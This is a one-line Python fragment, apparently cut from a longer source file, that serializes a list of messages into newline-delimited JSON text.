         lines = '\n'.join(json.dumps(item) for item in messages) + '\n'
